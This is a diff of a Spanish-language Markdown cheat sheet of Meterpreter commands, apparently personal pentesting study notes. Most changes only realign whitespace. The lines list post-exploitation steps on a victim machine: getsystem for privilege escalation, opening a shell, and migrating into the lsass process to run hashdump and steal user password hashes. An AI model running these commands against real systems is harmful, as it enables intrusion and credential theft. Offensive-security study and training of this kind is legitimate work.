@@ -1,6 +1,6 @@
 # Meterpreter Commands
 
-Tags: #Windows #Comandos #Meterpreter 
+Tags: #Comandos #Meterpreter 
 
 ## Meterpreter 
 
@@ -26,12 +26,12 @@ Es un multi-funcional payload que es ejecutado en memoria en un sistema victima 
 ❯ sessions                   # Miramos las sesiones activas 
 ❯ sessions -u <ID>           # Regresamos a la sesion 
 
-❯ sysinfo                  # Muestra informacion del Windows 
-❯ getuid                   # Miramos el nombre del usuario 
-❯ getprivs                 # Miramos los  procesos con privilegios 
-❯ getsystem                # Miras los procesos privilegiados 
-❯ pgrep explorer           # Mirar el numero del proceso y asi poder escalar privilegios 
-❯ search -f *.doc          # Buscar un archivo 
+❯ sysinfo                    # Muestra informacion del Windows 
+❯ getuid                     # Miramos el nombre del usuario 
+❯ getprivs                   # Miramos los  procesos con privilegios 
+❯ getsystem                  # Miras los procesos privilegiados 
+❯ pgrep explorer             # Mirar el numero del proceso y asi poder escalar privilegios 
+❯ search -f *.doc            # Buscar un archivo 
 
 ❯ shell                      # Nos carga una shell
 	❯ /bin/bash -i          # Si no nos crea la Shell con el comando anterior, lo hacemos con este 
@@ -39,7 +39,7 @@ Es un multi-funcional payload que es ejecutado en memoria en un sistema victima 
 ❯ cd /                       # Nos dirigimos a la raiz 'C:\'
 ❯ cat file.txt               # Miramos el contenido de un archivo 
 
-❯ hashdump                 # Te muestra todos los hashes de los usuarios, en dado caso que te salga este error 'Operation_failed: The parameter is incorrect', debemos de migrar a otro proceso.
+❯ hashdump                   # Te muestra todos los hashes de los usuarios, en dado caso que te salga este error 'Operation_failed: The parameter is incorrect', debemos de migrar a otro proceso.
 	❯ pgrep lsass              # Mirar el numero del proceso 'lsass'  
 	❯ migrate <ID>             # Nos migramos al proceso y asi poder mejorar la consola de Meterpreter, por lo que ahora podremos hacer el dumpeo de Hashes.  
 ```
